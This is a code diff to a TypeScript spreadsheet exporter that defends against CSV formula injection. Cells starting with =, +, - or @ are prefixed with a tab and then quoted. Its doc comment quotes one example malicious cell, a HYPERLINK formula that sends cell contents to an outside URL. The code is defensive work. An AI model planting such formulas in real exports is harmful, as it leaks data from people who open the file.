@@ -109,14 +109,32 @@ export function createSpreadsheet(data: Workbook, options: SpreadsheetOptions = 
   return new SpreadsheetWrapper(content, options.type || 'csv')
 }
 
-/** One cell, quoted only where a reader would otherwise misparse it. */
+/**
+ * One cell, quoted only where a reader would otherwise misparse it.
+ *
+ * A leading `=`, `+`, `-` or `@` is prefixed with a tab first. Those are the
+ * four characters a spreadsheet treats as the start of a formula, and a CSV is
+ * very often an export of data somebody else supplied: a display name of
+ * `=HYPERLINK("http://…"&A1)` sits inertly in a database and runs the moment
+ * the file is opened in Excel. The tab makes the cell text without changing
+ * what it says, which is why it is preferred to stripping the character.
+ *
+ * The PHP sibling does exactly the same thing, and the two have to agree byte
+ * for byte: they write the same product's exports, and a customer moving
+ * between them should not get a different file.
+ */
 // eslint-disable-next-line pickier/no-unused-vars
 function csvCell(cell: string | number): string {
-  const text = String(cell ?? '')
+  let text = String(cell ?? '')
+
+  if (text !== '' && '=+-@'.includes(text[0]!))
+    text = `\t${text}`
 
   // A lone carriage return breaks a row for the same reason a newline does,
-  // and Excel writes them, so it is quoted too.
-  if (text.includes(',') || text.includes('"') || text.includes('\n') || text.includes('\r'))
+  // and Excel writes them, so it is quoted too. The tab above is quoted for a
+  // different reason: unquoted, a reader splitting on tabs would take it as a
+  // column boundary.
+  if (text.includes(',') || text.includes('"') || text.includes('\n') || text.includes('\r') || text.includes('\t'))
     return `"${text.replace(/"/g, '""')}"`
 
   return text
